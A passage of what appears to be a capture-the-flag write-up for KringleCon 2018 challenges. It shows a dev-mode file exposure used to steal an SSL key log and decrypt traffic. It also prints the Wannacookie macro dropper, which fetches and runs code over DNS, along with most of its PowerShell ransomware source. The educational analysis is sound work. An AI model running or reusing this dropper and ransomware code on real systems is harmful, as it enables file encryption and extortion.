Forensics"},{"location":"Objectives/8-packalyzer.html#problem","text":"Santa has introduced a web-based packet capture and analysis tool at https://packalyzer.kringlecastle.com to support the elves and their information security work. Using the system, access and decrypt HTTP/2 network activity. What is the name of the song described in the document sent from Holly Evergreen to Alabaster Snowball? For hints on achieving this objective, please visit SugarPlum Mary and help her with the Python Escape from LA Cranberry Pi terminal challenge.","title":"Problem"},{"location":"Objectives/8-packalyzer.html#hints","text":"After solving the Python Escape from LA terminal, SugarPlum Mary provides these hints: Another elf told me that Packalyzer was rushed and deployed with development code sitting in the web root. Apparently, he found this out by looking at HTML comments left behind and was able to grab the server-side source code. There was suspicious-looking development code using environment variables to store SSL keys and open up directories. This elf then told me that manipulating values in the URL gave back weird and descriptive errors. I'm hoping these errors can't be used to compromise SSL on the website and steal logins. On a tooootally unrelated note, have you seen the HTTP2 talk at at KringleCon by the Chrises? I never knew HTTP2 was so different! SugarPlum must really want us to attend the KringleCon talk by Chris Elgee and Chris Davis called \"HTTP/2 - Because 1 is the Loneliest Number\", because she mentions it not once, but twice!","title":"Hints"},{"location":"Objectives/8-packalyzer.html#solution","text":"Finding nothing noteworthy about the logon page source code, I create an account and log into the webpage. I'm able to create a packet capture, but it's all encrypted traffic on port 443. Looking over the webpage source, I find the following comment that suggests that there is some server side code in app.js. //File upload Function. All extensions and sizes are validated server-side in app.js My initial attempt at loading https://packalyzer.kringlecastle.com/app.js fails with a Not Found error. Then I notice that images and CSS are being loaded out of the /pub directory, so I try https://packalyzer.kringlecastle.com/pub/app.js , and get a page full of Javascript back. I spend some time reading over the code, trying to determine what it does, and a few things stand out. const dev_mode = true; It seems the developers have left some development mode features enabled. Developers will often put special routines in their programs to help with testing and troubleshooting. These are supposed to be removed before pushing code to production, since they usually involve dangerous activities like bypassing security checks or exposing sensitive variables in the user interface. I save a copy of the .js file and search to see where dev_mode is referenced. C:\\hhc18 curl.exe -s -o app.js https://packalyzer.kringlecastle.com/pub/app.js C:\\hhc18 type app.js | find /n dev_mode [26]const dev_mode = true; [27]const key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.en v.SSLKEYLOGFILE ) [86]if (dev_mode) { In the block of code starting on line 86, a list of allowed directories is defined. Under normal conditions, users should only be able to access paths that begin with /pub/ and /uploads/, but with dev_mode enabled, any directory with the same name as an environment variable key will be permitted. If we can figure out what some of the environment variables are being used, we might be able to find something that the developer didn't intend for us to access. if (dev_mode) { //Can set env variable to open up directories during dev const env_dirs = load_envs(); } else { const env_dirs = [ /pub/ , /uploads/ ]; } This line hints that DEV and SSLKEYLOGFILE are environment variables, so those paths should be open to us. const key_log_path = ( !dev_mode || __dirname + process.env.DEV + process.env.SSLKEYLOGFILE ) Let's see what happens when we visit those URL's: C:\\hhc18 curl https://packalyzer.kringlecastle.com/sslkeylogfile/ Error: ENOENT: no such file or directory, open /opt/http2packalyzer_clientrandom_ssl.log/ C:\\hhc18 https://packalyzer.kringlecastle.com/dev/ Error: EISDIR: illegal operation on a directory, read From this, I'd have to deduce that ssl key log filename is packalyzer_clientrandom_ssl.log, and a /dev directory exists. Let's put those two things together: C:\\hhc18 curl -s https://packalyzer.kringlecastle.com/dev/packalyzer_clientrandom_ssl.log CLIENT_RANDOM 6C9AE5A23560F05E825A4B90F38F93DD6540C8D2EEB35ACC78CE0CFF40933DFA FAF08DD05340CDD46CC1745FEC3223FF9C4E4416861384AD2B2BF957DF7D671FEBB12ADC18B3BA41C183E943B482C352 CLIENT_RANDOM C1E4FD63396F6464220AE6488C01052EC0FF04A3273F905D398BB6AE1A2B2034 151F2960D6C9E9AD2855F0B22A85155D13C073ED34C5F3CF5FB5040F90F5662022A40558DD702F2B115A92668CE7268B CLIENT_RANDOM D94A8791854038E608243FC4EB27FB2CBE40A5C315929CBDC58881E0D8683F9F EE4082BEFAB006A5F5190F84BA62342E471F0C9139D3AF83D0011C19EEED96EB52BF0ED90AA5DEE1EC5AE4955F6D6967 CLIENT_RANDOM 4CFA5920FE0064A72AA754982567D09A56760D54912B8E10A967C7E9388DD189 9F18407AFACB57DB96325941BB25806ECF528D8DA915BC633B5A2D3738257C48B81994B0F560E5DEEAE8D71346343EA1 CLIENT_RANDOM 65E4B65F3C16CA2BC684D69FDFAEE53F72C795A12F32CE45202ED1BA9AD5E5EA F05717723276263EFC62BEAE10B157650D4C36327CB4197A95B458792B2189D0FE7C8798ED2B2CCA7836A8BA6EF14277 truncated Now we know where to obtain the ssl key log file from, but before downloading it, we need to run another packet capture. Note It's important to download the files in the right order. Each web connection is assigned a unique key to encrypt its data. Therefore, the ssl keys we need don't exist until the connections have been made. The encrypted data and the specific key that encrypted that data both have to be loaded into Wireshark for this to work. With both the packet capture and the ssl key log file downloaded, we can load these into Wireshark and view the unencrypted contents of the http2 packets. The ssl key log file goes into protocol preferences for ssl as shown here: The following credentials were found while analyzing the http2 data packets: Username Password alabaster Packer-p@re-turntable192 pepper Shiz-Bamer_wabl182 bushy Floppity_Floopy-flab19283 Alabaster is an admin, so let's try logging on as him first. I find that there's a saved packet capture in his account that is named \"super_secret_packet_capture.pcap\". Download and inspect this pcap in Wireshark, and you'll find an smtp mail transmission that contains a base64 encoded file attachment. 220 mail.kringlecastle.com ESMTP Postfix (Ubuntu) EHLO Mail.kringlecastle.com 250-mail.kringlecastle.com 250-PIPELINING 250-SIZE 10240000 250-VRFY 250-ETRN 250-STARTTLS 250-ENHANCEDSTATUSCODES 250-8BITMIME 250 DSN MAIL FROM: Holly.evergreen@mail.kringlecastle.com 250 2.1.0 Ok RCPT TO: alabaster.snowball@mail.kringlecastle.com 250 2.1.5 Ok DATA 354 End data with CR LF . CR LF Date: Fri, 28 Sep 2018 11:33:17 -0400 To: alabaster.snowball@mail.kringlecastle.com From: Holly.evergreen@mail.kringlecastle.com Subject: test Fri, 28 Sep 2018 11:33:17 -0400 MIME-Version: 1.0 Content-Type: multipart/mixed; boundary= ----=_MIME_BOUNDARY_000_11181 ------=_MIME_BOUNDARY_000_11181 Content-Type: text/plain Hey alabaster, Santa said you needed help understanding musical notes for accessing the vault. He said your favorite key was D. Anyways, the following attachment should give you all the information you need about transposing music. ------=_MIME_BOUNDARY_000_11181 Content-Type: application/octet-stream Content-Transfer-Encoding: BASE64 Content-Disposition: attachment JVBERi0xLjUKJb/3ov4KOCAwIG9iago8PCAvTGluZWFyaXplZCAxIC9MIDk3ODMxIC9IIFsgNzM4 IDE0MCBdIC9PIDEyIC9FIDc3MzQ0IC9OIDIgL1QgOTc1MTcgPj4KZW5kb2JqCiAgICAgICAgICAg snip ZDIwYjI1MmU0OWRiPl0gPj4Kc3RyZWFtCnicY2IAASZGRj0FBiYg6yiIZP8OIiWngUhGNRCpIw5m 2zMAAFMTA30KZW5kc3RyZWFtCmVuZG9iagogICAgICAgICAgICAgICAgICAgICAgICAgICAgIApz dGFydHhyZWYKMjE2CiUlRU9GCg== ------=_MIME_BOUNDARY_000_11181-- . 250 2.0.0 Ok: queued as 4CF931B5C3C0 QUIT 221 2.0.0 Bye Use a base64 to binary file converter, like the one at https://www.motobit.com/util/base64-decoder-encoder.asp to produce a file. Since the filename is mysteriously missing from the transmission, I use the file command in my bash shell to check the file type and discover that it is a PDF. $ file smtp.pdf smtp.pdf: PDF document, version 1 .5 Answer: Mary Had a Little Lamb","title":"Solution"},{"location":"Objectives/9-ransomware.html","text":"Objective #9: Ransomware Recovery Problem Alabaster Snowball is in dire need of your help. Santa's file server has been hit with malware. Help Alabaster Snowball deal with the malware on Santa's server by completing several tasks. For hints on achieving this objective, please visit Shinny Upatree and help him with the Sleigh Bell Lottery Cranberry Pi terminal challenge. Hints After completing the Sleigh Bell Lottery terminal challenge, Shinny Upatree provides these hints: Have you heard that Kringle Castle was hit by a new ransomware called Wannacookie? Several elves reported receiving a cookie recipe Word doc. When opened, a PowerShell screen flashed by and their files were encrypted. Many elves were affected, so Alabaster went to go see if he could help out. I hope Alabaster watched the PowerShell Malware talk at KringleCon before he tried analyzing Wannacookie on his computer. An elf I follow online said he analyzed Wannacookie and that it communicates over DNS. He also said that Wannacookie transfers files over DNS and that it looks like it grabs a public key this way. Another recent ransomware made it possible to retrieve crypto keys from memory. Hopefully the same is true for Wannacookie! Of course, this all depends how the key was encrypted and managed in memory. Proper public key encryption requires a private key to decrypt. Perhaps there is a flaw in the wannacookie author's DNS server that we can manipulate to retrieve what we need. If so, we can retrieve our keys from memory, decrypt the key, and then decrypt our ransomed files. Alabaster also provides a hint about public/private key encryption: wannacookie.min.ps1? I wonder if there is a non-minified version? If so, it may be easier to read and give us more information and maybe source comments? Alabaster also provides a hint about Memory Strings: Pulling strings from a memory dump using the linux strings command requires you specify the -e option with the specific format required by the OS and processor. Of course, you could also use powerdump https://github.com/chrisjd20/power_dump . Alabaster also provides a hint about Malware Kill Switches: I think I remember reading an article recently about Ransomware Kill Switchs https://www.wired.com/2017/05/accidental-kill-switch-slowed-fridays-massive-ransomware-attack/ . Wouldn't it be nice if our ransomware had one! Alabaster also provides a hint about Dropper Download: Word docm macros can be extracted using olevba https://github.com/decalage2/oletools/wiki/olevba . Perhaps we can use this to grab the ransomware source. Alabaster mentions a KringleCon talk by Chris Davis called \"Analyzing Powershell Malware\". Part 1: Catch the Malware Problem Assist Alabaster by building a Snort filter to identify the malware plaguing Santa's Castle. _ __ _ _ _____ _ _ | |/ / (_) | | / ____| | | | | | / _ __ _ _ __ __ _| | ___| | __ _ ___| |_| | ___ | | __| | _ \\ / _` | |/ _ \\ | / _` / __| __| |/ _ \\ | . \\| | | | | | | (_| | | __/ |___| (_| \\__ \\ |_| | __/ |_|\\_\\_| |_|_|_|_|\\__, |_|\\___|\\_____\\__,_|___/\\__|_|\\___| / ____| __/ | | | | (___ |___/ ___ _ __| |_ \\___ \\| _ \\ / _ \\| __| __| ____) | | | | (_) | | | |_ |_____/|_|_|_|\\___/|_|_ \\__| |_ _| __ \\ / ____| | | | | | | (___ _____ | | | | | |\\___ \\ __ / ____| _| |_| |__| |____) | /_ | | (___ |_____|_____/|_____/ _ __ | | \\___ \\ / _ \\ _ \\/ __|/ _ \\| __| | | ____) | __/ | | \\__ \\ (_) | | | | |_____/ \\___|_| |_|___/\\___/|_| |_| ============================================================ INTRO: Kringle Castle is currently under attacked by new piece of ransomware that is encrypting all the elves files. Your job is to configure snort to alert on ONLY the bad ransomware traffic. GOAL: Create a snort rule that will alert ONLY on bad ransomware traffic by adding it to snorts /etc/snort/rules/local.rules file. DNS traffic is constantly updated to snort.log.pcap COMPLETION: Successfully create a snort rule that matches ONLY bad DNS traffic and NOT legitimate user traffic and the system will notify you of your success. Check out ~/more_info.txt for additional information. elf@c67a3267484a:~$ cat ~/more_info.txt MORE INFO: A full capture of DNS traffic for the last 30 seconds is constantly updated to: /home/elf/snort.log.pcap You can also test your snort rule by running: snort -A fast -r ~/snort.log.pcap -l ~/snort_logs -c /etc/snort/snort.conf This will create an alert file at ~/snort_logs/alert This sensor also hosts an nginx web server to access the last 5 minutes worth of pcaps for offline analysis. These can be viewed by logging into: http://snortsensor1.kringlecastle.com/ Using the credentials: ---------------------- Username | elf Password | onashelf tshark and tcpdump have also been provided on this sensor. HINT: Malware authors often user dynamic domain names and IP addresses that change frequently within minutes or even seconds to make detecting and block malware more difficult. As such, its a good idea to analyze traffic to find patterns and match upon these patterns instead of just IP/domains. Solution Following the instructions in more.info, I downloaded a pcap file from the web server and opened it in Wireshark to analyze the traffic. The packet captures show that all of the malware-related traffic contains queries and responses for DNS TXT records. They each contain a different domain name, but the hostname always contains the same string \"77616E6E61636F6F6B69652E6D696E2E707331\". To isolate these packets, two rules can be used. The first detects UDP packets with destination port 53 that contain the first four bytes of the hostname. The second rule detects the response from UDP source port 53 containing the same string. To match the content of a packet, you specify the pattern in a series of hex codes for each character. 37 37 36 31 is the ascii hex equivalent of the text string 7761. alert udp any any - any 53 (msg: DNS query indicating wannacookie infection ; sid:10000001; rev:001; content: |37 37 36 31| ;) alert udp any 53 - any any (msg: DNS response indicating wannacookie infection ; sid:10000002; rev:001; content: |37 37 36 31| ;) When we save these rules into the local.rules file, we recieve the message Snort is alerting on all ransomware and only the ransomware! , which completes this step of the objective. Part 2: Identify the Domain Problem Using the Word docm file, identify the domain name that the malware communicates with. Solution Alabaster gives us a file named CHOCOLATE_CHIP_COOKIE_RECIPE.docm, which is the suspected source of the malware. Using olevba from the oletools pacakge to inspect the docm file, we find that it contains an Powershell script embedded in a macro that runs upon opening the document. root@kali:~/hhc18# olevba CHOCOLATE_CHIP_COOKIE_RECIPE.docm olevba 0.53.1 - http://decalage.info/python/oletools Flags Filename ----------- ----------------------------------------------------------------- OpX:MASI---- CHOCOLATE_CHIP_COOKIE_RECIPE.docm =============================================================================== FILE: CHOCOLATE_CHIP_COOKIE_RECIPE.docm Type: OpenXML ------------------------------------------------------------------------------- VBA MACRO ThisDocument.cls in file: word/vbaProject.bin - OLE stream: u VBA/ThisDocument - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - (empty macro) ------------------------------------------------------------------------------- VBA MACRO Module1.bas in file: word/vbaProject.bin - OLE stream: u VBA/Module1 - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - Private Sub Document_Open() Dim cmd As String cmd = powershell.exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C sal a New-Object; iex(a IO.StreamReader((a IO.Compression.DeflateStream([IO.MemoryStream][Convert]::FromBase64String( lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG ),[IO.Compression.CompressionMode]::Decompress)),[Text.Encoding]::ASCII)).ReadToEnd() Shell cmd End Sub +------------+-----------------+-----------------------------------------+ | Type | Keyword | Description | +------------+-----------------+-----------------------------------------+ | AutoExec | AutoOpen | Runs when the Word document is opened | | AutoExec | Document_Open | Runs when the Word or Publisher | | | | document is opened | | Suspicious | Shell | May run an executable file or a system | | | | command | | Suspicious | powershell | May run PowerShell commands | | Suspicious | ExecutionPolicy | May run PowerShell commands | | Suspicious | New-Object | May create an OLE object using | | | | PowerShell | | IOC | powershell.exe | Executable file name | +------------+-----------------+-----------------------------------------+ The payload is compressed and base64 encoded, so it's not immediately apparent what it does. To help get a better look at what's inside, we'll modify the code and allow it to run in a controlled fashion. Caution Always use an isolated test system to avoid an accidental infection or spread of the malware you're analyzing. If you don't have an Windows 10 test system handy, you can download a prebuilt virtual machine from Microsoft that's free to use for 90 days here: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ The modification is pretty simple. Below, we've made the following two changes: Replace the iex function call with a $ , which creates a text string out of the deobfuscated code instead of executing it. Pipe the resulting string to the host so it will be printed on the screen. Run this modified command at a Windows Command prompt: powershell . exe -NoE -Nop -NonI -ExecutionPolicy Bypass -C sal a New-Object; $( a IO . StreamReader (( a IO . Compression . DeflateStream ( [IO.MemoryStream][Convert] :: FromBase64String ( lVHRSsMwFP2VSwksYUtoWkxxY4iyir4oaB+EMUYoqQ1syUjToXT7d2/1Zb4pF5JDzuGce2+a3tXRegcP2S0lmsFA/AKIBt4ddjbChArBJnCCGxiAbOEMiBsfSl23MKzrVocNXdfeHU2Im/k8euuiVJRsZ1Ixdr5UEw9LwGOKRucFBBP74PABMWmQSopCSVViSZWre6w7da2uslKt8C6zskiLPJcJyttRjgC9zehNiQXrIBXispnKP7qYZ5S+mM7vjoavXPek9wb4qwmoARN8a2KjXS9qvwf+TSakEb+JBHj1eTBQvVVMdDFY997NQKaMSzZurIXpEv4bYsWfcnA51nxQQvGDxrlP8NxH/kMy9gXREohG ), [IO.Compression.CompressionMode] :: Decompress )), [Text.Encoding] :: ASCII )) .ReadToEnd() | Out-Host In the resulting output, we now see the deobfuscated code. function H2A ( $a ) { $o ; $a -split (..) | ? { $_ } | forEach { [char] ( [convert] :: toint16 ( $_ , 16 ))} | forEach { $o = $o + $_ }; return $o }; $f = 77616E6E61636F6F6B69652E6D696E2E707331 ; $h = ; foreach ( $i in 0 ..( [convert] :: ToInt32 (( Resolve-DnsName -Server erohetfanu . com -Name $f.erohetfanu.com -Type TXT ). strings , 10 )- 1 )) { $h += ( Resolve-DnsName -Server erohetfanu . com -Name $i.$f.erohetfanu.com -Type TXT ). strings }; iex ($( H2A $h | Out-string )) What does this code do? Declares a function that converts a hex-encoded string to ascii text output Defines a couple of variables, one of which is the hex-encoded text string for \"wannacookie.min.ps1\" Sets up a loop that iterates i times, where i is an integer value retrieved from a DNS TXT record 77616E6E61636F6F6B69652E6D696E2E707331.erohetfanu.com Each time the loop executes, it retrieves data from a DNS TXT record i.77616E6E61636F6F6B69652E6D696E2E707331.erohetfanu.com and concatenates them together into string $h After the final iteration, the hex-encoded value of $h is decoded to its text and executed with the iex function We can see from this that the domain name used in the malware is erohetfanu.com , which completes this part of the objective. Part 3: Stop the Malware Problem Identify a way to stop the malware in its tracks! Solution The code we found in part 2 was only a dropper, which is essentially just malware that downloads additional malware. In order to figure out how to stop the malware, we need to see what the dropper downloaded to Alabaster's computer. Using a similar approach as before, we'll remove the iex function from the dropper code and redirect the results to a file. function H2A ( $a ) { $o ; $a -split (..) | ? { $_ } | forEach { [char] ( [convert] :: toint16 ( $_ , 16 ))} | forEach { $o = $o + $_ }; return $o }; $f = 77616E6E61636F6F6B69652E6D696E2E707331 ; $h = ; foreach ( $i in 0 ..( [convert] :: ToInt32 (( Resolve-DnsName -Server erohetfanu . com -Name $f.erohetfanu.com -Type TXT ). strings , 10 )- 1 )) { $h += ( Resolve-DnsName -Server erohetfanu . com -Name $i.$f.erohetfanu.com -Type TXT ). strings }; $( H2A $h | Out-String ) | Out-File C : \\ hhc18 \\ wannacookie . min . ps1 When we execute this, the output is minified and difficult to read. $functions = { function e_d_file ( $key , $File , $enc_it ) { [byte[]] $key = $key ; $Suffix = `.wannacookie ; [System.Reflection.Assembly] :: LoadWithPartialName ( System.Security.Cryptography ); [System.Int32] $KeySize = $key . Length * 8 ; $AESP = New-Object System.Security.Cryptography.AesManaged ; $AESP . Mode = [System.Security.Cryptography.CipherMode] :: CBC ; $AESP . BlockSize = 128 ; $AESP . KeySize = $KeySize ; $AESP . Key = $key ; $FileSR = New-Object System . IO . FileStream ( $File , [System.IO.FileMode] :: Open ); if ( $enc_it ) { $DestFile = $File + $Suffix } else { $DestFile = ( $File -replace $Suffix )}; $FileSW = New-Object System . IO . FileStream ( $DestFile , [System.IO.FileMode] :: Create ); if ( $enc_it ) { $AESP . GenerateIV (); $FileSW . Write ( [System.BitConverter] :: GetBytes ( $AESP . IV . Length ), 0 , 4 ); $FileSW . Write ( $AESP . IV , 0 , $AESP . IV . Length ); $Transform = $AESP . CreateEncryptor ()} else { [Byte[]] $LenIV = New-Object Byte [] 4 ; $FileSR . Seek ( 0 , [System.IO.SeekOrigin] :: Begin ) | Out-Null ; $FileSR . Read ( $LenIV , 0 , 3 ) | Out-Null ; [Int] $LIV = [System.BitConverter] :: ToInt32 ( $LenIV , 0 ); [Byte[]] $IV = New-Object Byte [] $LIV ; $FileSR . Seek ( 4 , [System.IO.SeekOrigin] :: Begin ) | Out-Null ; $FileSR . Read ( $IV , 0 , $LIV ) | Out-Null ; $AESP . IV = $IV ; $Transform = $AESP . CreateDecryptor ()}; $CryptoS = New-Object System . Security . Cryptography . CryptoStream ( $FileSW , $Transform , [System.Security.Cryptography.CryptoStreamMode] :: Write ); [Int] $Count = 0 ; [Int] $BlockSzBts = $AESP . BlockSize / 8 ; [Byte[]] $Data = New-Object Byte [] $BlockSzBts ; Do { $Count = $FileSR . Read ( $Data , 0 , $BlockSzBts ); $CryptoS . Write ( $Data , 0 , $Count )} While ( $Count -gt 0 ); $CryptoS . FlushFinalBlock (); $CryptoS . Close (); $FileSR . Close (); $FileSW . Close (); Clear-variable -Name key ; Remove-Item $File }}; function H2B { param ( $HX ); $HX = $HX -split (..) | ? { $_ }; ForEach ( $value in $HX ){ [Convert] :: ToInt32 ( $value , 16 )}}; function A2H (){ Param ( $a ); $c = ; $b = $a . ToCharArray ();; Foreach ( $element in $b ) { $c = $c + + [System.String] :: Format ( {0:X} , [System.Convert] :: ToUInt32 ( $element ))}; return $c -replace }; function H2A () { Param ( $a ); $outa ; $a -split (..) | ? { $_ } | forEach { [char] ( [convert] :: toint16 ( $_ , 16 ))} | forEach { $outa = $outa + $_ }; return $outa }; function B2H { param ( $DEC ); $tmp = ; ForEach ( $value in $DEC ){ $a = {0:x} -f [Int] $value ; if ( $a . length -eq 1 ){ $tmp += 0 + $a } else { $tmp += $a }}; return $tmp }; function ti_rox { param ( $b1 , $b2 ); $b1 = $( H2B $b1 ); $b2 = $( H2B $b2 ); $cont = New-Object Byte [] $b1 . count ; if ( $b1 . count -eq $b2 . count ) { for ( $i = 0 ; $i -lt $b1 . count ; $i ++) { $cont [ $i ] = $b1 [ $i ] -bxor $b2 [ $i ]}}; return $cont }; function B2G { param ( [byte[]] $Data ); Process { $out = [System.IO.MemoryStream] :: new (); $gStream = New-Object System . IO . Compression . GzipStream $out , ( [IO.Compression.CompressionMode] :: Compress ); $gStream . Write ( $Data , 0 , $Data . Length ); $gStream . Close (); return $out . ToArray ()}}; function G2B { param ( [byte[]] $Data ); Process { $SrcData = New-Object System . IO . MemoryStream ( , $Data ); $output = New-Object System . IO . MemoryStream ; $gStream = New-Object System . IO . Compression . GzipStream $SrcData , ( [IO.Compression.CompressionMode] :: Decompress ); $gStream . CopyTo ( $output ); $gStream . Close (); $SrcData . Close (); [byte[]] $byteArr = $output . ToArray (); return $byteArr }}; function sh1 ( [String] $String ) { $SB = New-Object System . Text . StringBuilder ; [System.Security.Cryptography.HashAlgorithm] :: Create ( SHA1 ). ComputeHash ( [System.Text.Encoding] :: UTF8 . GetBytes ( $String ))|%{ [Void] $SB . Append ( $_ . ToString ( x2 ))}; $SB . ToString ()}; function p_k_e ( $key_bytes , [byte[]] $pub_bytes ){ $cert = New-Object -TypeName System . Security . Cryptography . X509Certificates . X509Certificate2 ; $cert . Import ( $pub_bytes ); $encKey = $cert . PublicKey . Key . Encrypt ( $key_bytes , $true ); return $( B2H $encKey )}; function e_n_d { param ( $key , $allfiles , $make_cookie ); $tcount = 12 ; for ( $file = 0 ; $file -lt $allfiles . length ; $file ++ ) { while ( $true ) { $running = @( Get-Job | Where-Object { $_ . State -eq Running }); if ( $running . Count -le $tcount ) { Start-Job -ScriptBlock { param ( $key , $File , $true_false ); try { e_d_file $key $File $true_false } catch { $_ . Exception . Message | Out-String | Out-File $( $env:userprofile + \\Desktop\\ps_log.txt ) -append }} -args $key , $allfiles [ $file ], $make_cookie -InitializationScript $functions ; break } else { Start-Sleep -m 200 ; continue }}}}; function g_o_dns ( $f ) { $h = ; foreach ( $i in 0 ..( [convert] :: ToInt32 ($( Resolve-DnsName -Server erohetfanu . com -Name $f.erohetfanu.com -Type TXT ). Strings , 10 )- 1 )) { $h += $( Resolve-DnsName -Server erohetfanu . com -Name $i.$f.erohetfanu.com -Type TXT ). Strings }; return ( H2A $h )}; function s_2_c ( $astring , $size = 32 ) { $new_arr = @(); $chunk_index = 0 ; foreach ( $i in 1 ..$( $astring . length / $size )) { $new_arr += @( $astring . substring ( $chunk_index , $size )); $chunk_index += $size }; return $new_arr }; function snd_k ( $enc_k ) { $chunks = ( s_2_c $enc_k ); foreach ( $j in $chunks ) { if ( $chunks . IndexOf ( $j ) -eq 0 ) { $n_c_id = $( Resolve-DnsName -Server erohetfanu . com -Name $j.6B6579666F72626F746964.erohetfanu.com -Type TXT ). Strings } else {$( Resolve-DnsName -Server erohetfanu . com -Name $n_c_id.$j.6B6579666F72626F746964.erohetfanu.com -Type TXT ). Strings }}; return $n_c_id }; function wanc { $S1 = 1f8b080000000000040093e76762129765e2e1e6640f6361e7e202000cdd5c5c10000000 ; if ( $null -ne (( Resolve-DnsName -Name $( H2A $( B2H $( ti_rox $( B2H $( G2B $( H2B $S1 ))) $( Resolve-DnsName -Server erohetfanu . com -Name 6B696C6C737769746368 . erohetfanu . com -Type TXT ). Strings ))). ToString () -ErrorAction 0 -Server 8 . 8 . 8 . 8 ))) { return }; if ($( netstat -ano | Select-String 127.0.0.1:8080 ). length -ne 0 -or ( Get-WmiObject Win32_ComputerSystem ). Domain -ne KRINGLECASTLE ) { return }; $p_k = [System.Convert] :: FromBase64String ($( g_o_dns ( 7365727665722E637274 ) ) ); $b_k = ( [System.Text.Encoding] :: Unicode . GetBytes ($(( [char[]] ( [char]01..[char] 255 ) + ( [char[]] ( [char]01..[char] 255 )) + 0 .. 9 | sort { Get-Random })[ 0 .. 15 ] -join )) | ? { $_ -ne 0x00 }); $h_k = $( B2H $b_k ); $k_h = $( sh1 $h_k ); $p_k_e_k = ( p_k_e $b_k $p_k ). ToString (); $c_id = ( snd_k $p_k_e_k ); $d_t = (($( Get-Date ). ToUniversalTime () | Out-String ) -replace `r`n ); [array] $f_c = $( Get-ChildItem *. elfdb -Exclude *. wannacookie -Path $($( $env:userprofile + \\Desktop ),$( $env:userprofile + \\Documents ),$( $env:userprofile + \\Videos ),$( $env:userprofile + \\Pictures ),$( $env:userprofile + \\Music )) -Recurse | where { ! $_ . PSIsContainer } | Foreach -Object { $_ . Fullname }); e_n_d $b_k $f_c $true ; Clear-variable -Name h_k ; Clear-variable -Name b_k ; $lurl = http://127.0.0.1:8080/ ; $html_c = @{ GET / = $( g_o_dns ( A2H source.min.html )); GET /close = p Bye! /p }; Start-Job -ScriptBlock { param ( $url ); Start-Sleep 10 ; Add-type -AssemblyName System . Windows . Forms ; start-process $url -WindowStyle Maximized ; Start-sleep 2 ; [System.Windows.Forms.SendKeys] :: SendWait ( {F11} )} -Arg $lurl ; $list = New-Object System . Net . HttpListener ; $list . Prefixes . Add ( $lurl ); $list . Start (); try { $close = $false ; while ( $list . IsListening ) { $context = $list . GetContext (); $Req = $context . Request ; $Resp = $context . Response ; $recvd = {0} {1} -f $Req . httpmethod , $Req . url . localpath ; if ( $recvd -eq GET / ) { $html = $html_c [ $recvd ]} elseif ( $recvd -eq GET /decrypt ) { $akey = $Req . QueryString . Item ( key ); if ( $k_h -eq $( sh1 $akey )) { $akey = $( H2B $akey ); [array] $f_c = $( Get-ChildItem -Path $( $env:userprofile ) -Recurse -Filter *. wannacookie | where { ! $_ . PSIsContainer } | Foreach -Object { $_ . Fullname }); e_n_d $akey $f_c $false ; $html = Files have been decrypted! ; $close = $true } else { $html = Invalid Key! }} elseif ( $recvd -eq GET /close ) { $close = $true ; $html = $html_c [ $recvd ]} elseif ( $recvd -eq GET /cookie_is_paid ) { $c_n_k = $( Resolve-DnsName -Server erohetfanu . com -Name ( $c_id.72616e736f6d697370616964.erohetfanu.com . trim ()) -Type TXT ). Strings ; if ( $c_n_k . length -eq 32 ) { $html = $c_n_k } else { $html = UNPAID|$c_id|$d_t }} else { $Resp . statuscode = 404 ; $html = h1 404 Not Found /h1 }; $buffer = [Text.Encoding] :: UTF8 . GetBytes ( $html ); $Resp . ContentLength64 = $buffer . length ; $Resp . OutputStream . Write ( $buffer , 0 , $buffer . length ); $Resp . Close (); if ( $close ) { $list . Stop (); return }}} finally { $list . Stop ()}}; wanc ; Note To minify code means to shorten variable names and remove whitespace to make the code more compact. We could try to clean this up manually using a Powershell code beautifier or some strategic search and replace operations, but it was hinted that there might be an unminified version of the code available. Since the string \"77616E6E61636F6F6B69652E6D696E2E707331\" is hex-encoded text string \"wannacookie.min.ps1\", what if we change it to \"77616E6E61636F6F6B69652E707331\" (wannacookie.ps1) and execute the code again? function H2A ( $a ) { $o ; $a -split (..) | ? { $_ } | forEach { [char] ( [convert] :: toint16 ( $_ , 16 ))} | forEach { $o = $o + $_ }; return $o }; ` $f = 77616E6E61636F6F6B69652E6D696E2E707331 ; $h = ; foreach ( $i in 0 ..( [convert] :: ToInt32 (( Resolve-DnsName -Server erohetfanu . com ` -Name $f.erohetfanu.com -Type TXT ). strings , 10 )- 1 )) { $h += ( Resolve-DnsName -Server erohetfanu . com -Name $i.$f.erohetfanu.com ` -Type TXT ). strings }; $( H2A $h | Out-string ) | Out-File C : \\ hhc18 \\ wannacookie . ps1 This time we get a file that's much easier on human eyes. $functions = { function Enc_Dec -File ( $key , $File , $enc_it ) { [byte[]] $key = $key $Suffix = `.wannacookie [System.Reflection.Assembly] :: LoadWithPartialName ( System.Security.Cryptography ) [System.Int32] $KeySize = $key . Length * 8 $AESP = New-Object System.Security.Cryptography.AesManaged $AESP . Mode = [System.Security.Cryptography.CipherMode] :: CBC $AESP . BlockSize = 128 $AESP . KeySize = $KeySize $AESP . Key = $key $FileSR = New-Object System . IO . FileStream ( $File , [System.IO.FileMode] :: Open ) if ( $enc_it ) { $DestFile = $File + $Suffix } else { $DestFile = ( $File -replace $Suffix )} $FileSW = New-Object System . IO . FileStream ( $DestFile , [System.IO.FileMode] :: Create ) if ( $enc_it ) { $AESP . GenerateIV () $FileSW . Write ( [System.BitConverter] :: GetBytes ( $AESP . IV . Length ), 0 , 4 ) $FileSW . Write ( $AESP . IV , 0 , $AESP . IV . Length ) $Transform = $AESP . CreateEncryptor () } else { [Byte[]] $LenIV = New-Object Byte [] 4 $FileSR . Seek ( 0 , [System.IO.SeekOrigin] :: Begin ) | 